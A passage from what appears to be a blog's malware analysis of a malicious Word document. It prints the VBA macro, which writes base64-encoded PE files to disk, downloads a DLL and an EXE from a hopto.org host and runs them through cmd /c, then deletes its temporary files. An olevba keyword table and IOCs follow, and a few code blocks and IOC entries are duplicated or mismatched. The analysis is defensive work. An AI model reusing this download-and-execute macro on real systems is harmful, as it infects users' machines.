\u0026#34;UCIAAAAAAAAAAAAAAAAAAKgDTG9hZExpYnJhcnlBAACkAkdldFByb2NBZGRyZXNzAACkAUZyZWVMaWJyYXJ5AN4FV2luRXhlYwBLRVJORUwzMi5kbGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAACmEAAAjCEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; FuEmdPath2 = Environ(\u0026#34;PUBLIC\u0026#34;) \u0026amp; \u0026#34;\\sl2.tmp\u0026#34; em.Text = lgstr em.DataType = \u0026#34;bin.base64\u0026#34; Stream.Type = 1 Stream.Open Stream.Write em.NodeTypedValue Stream.SaveToFile FuEmdPath2, 2 Dim lb As LongPtr Dim pa As LongPtr Dim pas As LongPtr Dim retValue As Long Dim Gud As String Dim hCurprocess As Boolean Dim Embedded As String Dim Outp As String ActiveDocument.Content.Font.Hidden = False lb = LoadLibrary(FuEmdPath1) pa = GetProcAddress(lb, \u0026#34;RCT\u0026#34;) If pa \u0026lt; 1 Then FreeLibrary (lb) lb = LoadLibrary(FuEmdPath2) pa = GetProcAddress(lb, \u0026#34;RCT\u0026#34;) End If pas = GetProcAddress(lb, \u0026#34;RCP\u0026#34;) Gud = MyDecode(\u0026#34;aHR0cHM6Ly9hcm15YmFyLmhvcHRvLm9yZy9Mb2dpTWFpbC5kbGwJc34DSga\u0026#34;) \u0026#39;Dllurl Outp = Environ(\u0026#34;LOCALAPPDATA\u0026#34;) + MyDecode(\u0026#34;XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWwuZGxs\u0026#34;) retValue = CallWindowProc(pa, ByVal 1\u0026amp;, ByVal 2\u0026amp;, Gud, Outp) Gud = MyDecode(\u0026#34;aHR0cHM6Ly9hcm15YmFyLmhvcHRvLm9yZy9Mb2dpTWFpbEFwcC5leGUJc34DSga\u0026#34;) \u0026#39;Exeurl Outp = Environ(\u0026#34;LOCALAPPDATA\u0026#34;) + MyDecode(\u0026#34;XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWxBcHAuZXhl\u0026#34;) retValue = CallWindowProc(pa, ByVal 1\u0026amp;, ByVal 2\u0026amp;, Gud, Outp) Embedded = \u0026#34;c\u0026#34; \u0026amp; \u0026#34;m\u0026#34; \u0026amp; \u0026#34;d\u0026#34; \u0026amp; \u0026#34; /c \u0026#34; \u0026amp; Outp retValue = CallWindowProc(pas, ByVal 1\u0026amp;, ByVal 2\u0026amp;, Gud, Embedded) FreeLibrary (lb) Dim filesys Set filesys = CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;) If filesys.FileExists(FuEmdPath1) Then filesys.DeleteFile FuEmdPath1 End If If filesys.FileExists(FuEmdPath2) Then filesys.DeleteFile FuEmdPath2 End If End Sub +----------+--------------------+---------------------------------------------+ |Type |Keyword |Description | +----------+--------------------+---------------------------------------------+ |AutoExec |Document_Open |Runs when the Word or Publisher document is | | | |opened | |Suspicious|Environ |May read system environment variables | |Suspicious|Open |May open a file | |Suspicious|Write |May write to a file (if combined with Open) | |Suspicious|ADODB.Stream |May create a text file | |Suspicious|SaveToFile |May create a text file | |Suspicious|Call |May call a DLL using Excel 4 Macros (XLM/XLF)| |Suspicious|CreateObject |May create an OLE object | |Suspicious|Lib |May run code from a DLL | |Suspicious|URLDownloadToFileA |May download files from the Internet | | | |(obfuscation: Base64) | |Suspicious|Hex Strings |Hex-encoded strings were detected, may be | | | |used to obfuscate strings (option --decode to| | | |see all) | |Suspicious|Base64 Strings |Base64-encoded strings were detected, may be | | | |used to obfuscate strings (option --decode to| | | |see all) | |IOC |Wininet.dll |Executable file name (obfuscation: Base64) | |IOC |Urlmon.dll |Executable file name (obfuscation: Base64) | |IOC |utfc.dll |Executable file name (obfuscation: Base64) | |IOC |KERNEL32.dll |Executable file name (obfuscation: Base64) | |IOC |UrlDownloadToFile.dl|Executable file name (obfuscation: Base64) | | |l | | |IOC |LogiMail.dll |Executable file name (obfuscation: Base64) | |IOC |LogiMailApp.exe |Executable file name (obfuscation: Base64) | |Base64 |\\Microsoft\\Office\\Lo|XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWwuZGxs | |String |giMail.dll | | |Base64 |\\Microsoft\\Office\\Lo|XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWxBcHAuZXhl | |String |giMailApp.exe | | +----------+--------------------+---------------------------------------------+ Looking at the extracted macro, function Document_Open were being used which means the code will be run when the document was open. There are 2 functions which are AES to decode the given value from Base64 and MyDecode function that replaces custom encoded placeholders (\u0026ldquo;uPCgt131\u0026rdquo;, \u0026ldquo;Jc34DSga\u0026rdquo;) with Base64 padding characters (== and =).\nExamining Document_Open() This function starts of with contructing lgstr which is a base64 encoded binary data. and then save temporary in PUBLIC\\ folder.\nbinary data or lgstr construction:\nsl1.tmp\nlgstr = \u0026#34;T\u0026#34; \u0026amp; \u0026#34;V\u0026#34; \u0026amp; \u0026#34;qQA\u0026#34; \u0026amp; \u0026#34;AMAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;EAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADdY4TFmQLqlpkC6paZAuqWRP0hlpoC6paZAuuWnQLqlmtb45ebAuqWa1vql5gC6pZrW+iXmALqllJpY2iZAuqW\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAEwBAwAxUuFdAAAAAAAAAADgAAIhCwEOAAACAAAABgAAAAAAAAAAAAAAEAAAACAAAAAAABAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAEAFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAsCAAAE0AAAC0IQAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAgAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;cCAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAIAAAAAAEAAAAAIAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAA4AgAAACAAAAAEAAAABgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAIAAAAAAwAAAAAgAAAAoAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7FZoICAAEP8VDCAAEIvwhfZ0HGgsIAAQVv8VACAAEIXAdAX/dRD/0Fb/FQQgABBoRCAAEP8VDCAAEIvwhfZ0JWhQIAAQVv8VACAAEIXAdA5qAGoA/3UU/3UQagD/0Fb/FQQgABBeXcPMzMzMzMxVi+xqAP91FP8VCCAAEF3D\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;ACIAABIiAAAgIgAA8CEAAAAAAAAAAAAAAAAAAAAAAABXaW5pbmV0LmRsbABEZWxldGVVcmxDYWNoZUVudHJ5QQAAAABVcmxtb24uZGxsAABVUkxEb3dubG9hZFRvRmlsZUEAAAAAAAAAAAAAAAAAAAAAAAAxUuFdAAAAAA0AAAC0AAAAACEAAAAHAAAAAAAAMVLhXQAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMVLhXQAAAADsIAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AQAAAAIAAAACAAAA2CAAAOAgAADoIAAAcBAAAAAQAAD1IAAA+SAAAAAAAQB1dGZjLmRsbABSQ1AAUkNUAAAAAEdDVEwAEAAAgAAAAC50ZXh0JG1uAAAAAAAgAAAUAAAALmlkYXRhJDUAAAAAICAAAIgAAAAucmRhdGEAALAgAABNAAAALmVkYXRhAAAAIQAAtAAAAC5yZGF0YSR6enpkYmcAAAC0IQAAFAAAAC5pZGF0YSQyAAAAAMghAAAUAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;LmlkYXRhJDMAAAAA3CEAABQAAAAuaWRhdGEkNAAAAADwIQAASAAAAC5pZGF0YSQ2AAAAANwhAAAAAAAAAAAAACoiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIgAAEiIAACAiAADwIQAAAAAAAKUDTG9hZExpYnJhcnlBAACdAkdldFByb2NBZGRyZXNzAACeAUZyZWVMaWJyYXJ5AM4FV2luRXhlYwBLRVJORUwzMi5kbGwAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAgAAAABTALMBYwHTAtMDIwODBDMEowYzB6MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; sl2.tmp\nlgstr = \u0026#34;T\u0026#34; \u0026amp; \u0026#34;V\u0026#34; \u0026amp; \u0026#34;qQA\u0026#34; \u0026amp; \u0026#34;AMAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;EAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADdY4TFmQLqlpkC6paZAuqWRP0hlpoC6paZAuuWnQLqlmtb45ebAuqWa1vql5gC6pZrW+iXmALqllJpY2iZAuqW\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGAwBgjOFdAAAAAAAAAADwACIgCwIOAAACAAAABgAAAAAAAAAAAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAKAhAABaAAAA/CEAACgAAAAAAAAAAAAAAAAwAAAMAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAIAgAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAC8AAAAABAAAAACAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAmAIAAAAgAAAABAAAAAYAAAAAAAAAAAAAAAAAAEAAAEAucGRhdGEAAAwAAAAAMAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAIAAAAKAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiJXCQISIl0JBBXSIPsMEiNDRoQAABJi/FJi/j/FfYPAABIi9hIhcB0I0iNFQ8QAABIi8j/FcYPAABIhcB0BUiLz//QSIvL/xW7DwAASI0NBBAAAP8Vvg8AAEiL2EiFwHQ0SI0V/w8AAEiLyP8Vjg8AAEiFwHQWRTPJSMdEJCAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAATIvGSIvXM8n/0EiLy/8Vcg8AAEiLXCRASIt0JEhIg8QwX8PMzMzMzMzMzMzMM9JJi8lI/yVUDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;YCIAAAAAAAByIgAAAAAAAIAiAAAAAAAAUCIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV2luaW5ldC5kbGwAAAAAAERlbGV0ZVVybENhY2hlRW50cnlBAAAAAFVybG1vbi5kbGwAAAAAAABVUkxEb3dubG9hZFRvRmlsZUEAAAAAAAAAAAAAYIzhXQAAAAANAAAA1AAAALggAAC4BgAAAAAAAGCM4V0AAAAADgAAAAAAAAAAAAAAAAAAAEdDVEwAEAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;vAAAAC50ZXh0JG1uAAAAAAAgAAAoAAAALmlkYXRhJDUAAAAAMCAAAIgAAAAucmRhdGEAALggAADUAAAALnJkYXRhJHp6emRiZwAAAIwhAAAQAAAALnhkYXRhAACgIQAAWgAAAC5lZGF0YQAA/CEAABQAAAAuaWRhdGEkMgAAAAAQIgAAFAAAAC5pZGF0YSQzAAAAACgiAAAoAAAALmlkYXRhJDQAAAAAUCIAAEgAAAAuaWRhdGEkNgAAAAAAMAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;DAAAAC5wZGF0YQAAAQ8GAA9kCQAPNAgAD1ILcAAAAAAAAAAAX4zhXQAAAADcIQAAAQAAAAIAAAACAAAAyCEAANAhAADYIQAAsBAAAAAQAADyIQAA9iEAAAAAAQBVcmxEb3dubG9hZFRvRmlsZS5kbGwAUkNQAFJDVAAAACgiAAAAAAAAAAAAAIoiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYCIAAAAAAAByIgAAAAAAAIAiAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;UCIAAAAAAAAAAAAAAAAAAKgDTG9hZExpYnJhcnlBAACkAkdldFByb2NBZGRyZXNzAACkAUZyZWVMaWJyYXJ5AN4FV2luRXhlYwBLRVJORUwzMi5kbGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAACmEAAAjCEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; Code section to write the binary\nFuEmdPath1 = Environ(\u0026#34;PUBLIC\u0026#34;) \u0026amp; \u0026#34;\\sl1.tmp\u0026#34; em.Text = lgstr em.DataType = \u0026#34;bin.base64\u0026#34; Stream.Type = 1 Stream.Open Stream.Write em.NodeTypedValue Stream.SaveToFile FuEmdPath1, 2 FuEmdPath2 = Environ(\u0026#34;PUBLIC\u0026#34;) \u0026amp; \u0026#34;\\sl2.tmp\u0026#34; em.Text = lgstr em.DataType = \u0026#34;bin.base64\u0026#34; Stream.Type = 1 Stream.Open Stream.Write em.NodeTypedValue Stream.SaveToFile FuEmdPath2, 2 To verify if it is an actual binary, the early sections of the string can be decoded and examine its header.\nByte MZ and This program cannot be run in DOS mode. indicates its a PE file.\nThe function then continue with fetching few files from a hosting server and save it into the computer\nGud = MyDecode(\u0026#34;aHR0cHM6Ly9hcm15YmFyLmhvcHRvLm9yZy9Mb2dpTWFpbC5kbGwJc34DSga\u0026#34;) \u0026#39;Dllurl Outp = Environ(\u0026#34;LOCALAPPDATA\u0026#34;) + MyDecode(\u0026#34;XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWwuZGxs\u0026#34;) retValue = CallWindowProc(pa, ByVal 1\u0026amp;, ByVal 2\u0026amp;, Gud, Outp) The above section of code fetching a file from url https://armybar[.]hopto.org/LogiMail[.]dll\tand then save into \\Microsoft\\Office\\LogiMail.dll\nGud = MyDecode(\u0026#34;aHR0cHM6Ly9hcm15YmFyLmhvcHRvLm9yZy9Mb2dpTWFpbEFwcC5leGUJc34DSga\u0026#34;) \u0026#39;Exeurl Outp = Environ(\u0026#34;LOCALAPPDATA\u0026#34;) + MyDecode(\u0026#34;XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWxBcHAuZXhl\u0026#34;) retValue = CallWindowProc(pa, ByVal 1\u0026amp;, ByVal 2\u0026amp;, Gud, Outp) Embedded = \u0026#34;c\u0026#34; \u0026amp; \u0026#34;m\u0026#34; \u0026amp; \u0026#34;d\u0026#34; \u0026amp; \u0026#34; /c \u0026#34; \u0026amp; Outp retValue = CallWindowProc(pas, ByVal 1\u0026amp;, ByVal 2\u0026amp;, Gud, Embedded) The above section of code does something similar but different file. First fetching a file from url https://armybar[.]hopto.org/LogiMailApp[.]exe then save it into \\Microsoft\\Office\\LogiMailApp.exe.\nDim filesys Set filesys = CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;) If filesys.FileExists(FuEmdPath1) Then filesys.DeleteFile FuEmdPath1 End If If filesys.FileExists(FuEmdPath2) Then filesys.DeleteFile FuEmdPath2 End If Then, this code shows that the function executes cmd /c \\Microsoft\\Office\\LogiMailApp.exe\nDim filesys Set filesys = CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;) If filesys.FileExists(FuEmdPath1) Then filesys.DeleteFile FuEmdPath1 End If If filesys.FileExists(FuEmdPath2) Then filesys.DeleteFile FuEmdPath2 End If Lastly, the function ends by deleting the temporary file sl1.tmp and sl2.tmp\n5. IOCs IOC Type LogiMail.dll Executable File Name https://armybar[.]hopto.org/LogiMail[.]dll URL LogiMail.exe Executable File Name https://armybar[.]hopto.org/LogiMail[.]dll URL ","permalink":"http://localhost:1313/posts/bubar-parlimen/","summary":"\u003cp\u003eA \u003ccode\u003ebubarparlimen.docx\u003c/code\u003e file with an external \u003ccode\u003eRemoteLoad.dotm\u003c/code\u003e attached template file where it contains malicious VBA Macro which will write \u003ccode\u003ePE\u003c/code\u003e files, fetch \u003ccode\u003e.exe\u003c/code\u003e + \u003ccode\u003e.dll\u003c/code\u003e file and executing it in the infected machine. The macro uses base64 encoding method and constructing the encoded string little by little to avoid suspicion.\u003c/p\u003e\n\u003ch2 id=\"2-case-details\"\u003e2. Case Details\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003cstrong\u003eFile Name\u003c/strong\u003e\u003c/th\u003e\n          \u003cth\u003ebubarparlimen.docx\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eFile Size\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e214.91 KiB\u003c/td\u003e\n      \u003c/tr\u003e\n      